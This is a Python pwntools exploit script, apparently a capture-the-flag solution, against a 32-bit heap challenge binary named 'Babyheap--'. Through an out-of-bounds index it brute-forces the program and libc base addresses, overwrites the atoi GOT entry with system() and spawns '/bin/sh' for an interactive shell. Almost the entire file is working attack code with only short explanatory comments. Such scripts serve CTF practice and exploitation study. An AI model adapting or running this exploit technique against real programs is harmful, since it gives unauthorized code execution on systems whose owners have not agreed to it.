#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'i386'

context.timeout = 2
BIN = './Babyheap--'
e = ELF(BIN)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

idx_of_heapbase = -104

##### get elf end #####
g = False
elf_off = 0
for i in range((-0x300000//4) - 105, -0xffffffff, -1024):
    r.sendafter('entry : ', str(i))
    r.sendafter('data : ', 'Q')

    """
    if data content can't write into entry, it will become the next input content of read(), which is read(0, entry, 12)
    """
    res = r.recvuntil('entry : data : ')
    if res != b'entry : data : ':
        g = True
    else:
        r.send('Q') # write data into entry 81 (ord('Q') == 81)

    if g:
        success(f'Entry: {i}, Offset: {hex(i*4)}')
        elf_off = i + 1
        break


##### overwrite ptr to 0 #####
ptr_off = elf_off - 1012
r.send(str(ptr_off))
r.sendafter('data : ', p32(0))

##### leak elf #####
elf_base = 0
r.sendafter('entry : ', '12345678910')
r.recvuntil('data : ')
"""
send entry -> read entry -> send data -> if entry is wrong, read will not receive data, and data will become next entry ; so that, we send data as entry number.

However, if it comes with real entry number, the rest entry number (4 byte for data) will automatically become next entry number, making us cannot know which entry number is real.

My solution is that sending 'A' as data content, and judging if it is real.
"""
for i in range(0x55000000 // 4, 0xffffffff, 1024):
    r.sendline('A') # clear buffer + check if success
    # 'A' and last entry number will be next entry number to clear buffer
    
    res = r.recvuntil('entry : data : ')
    if res != b'entry : data : ':
        elf_base = (i-1024)*4 - 0x4000
        success(f'Entry: {i}, elf_base: {hex(elf_base)}')
        break
    
    r.sendline(str(i)) # will be next entry
    res = r.recvuntil('entry : data : ')

##### leak libc #####
r.send('12345678910')
r.recvuntil('data : ')
libc_base = 0
for i in range(0xf7000000 // 4, 0xffffffff, 1024):
    r.sendline('A')
    
    res = r.recvuntil('entry : data : ')
    if res != b'entry : data : ':
        libc_base = (i-1024)*4 - 0x1eb000
        success(f'Entry: {i}, libc_base: {hex(libc_base)}')
        break
    
    r.sendline(str(i)) # will be next entry
    res = r.recvuntil('entry : data : ')

system_addr = libc_base + 0x45830
atoi_got = elf_base + 0x4020

r.send(str(atoi_got // 4))
r.sendafter('data : ', p32(system_addr))

r.sendline('/bin/sh')
r.interactive()
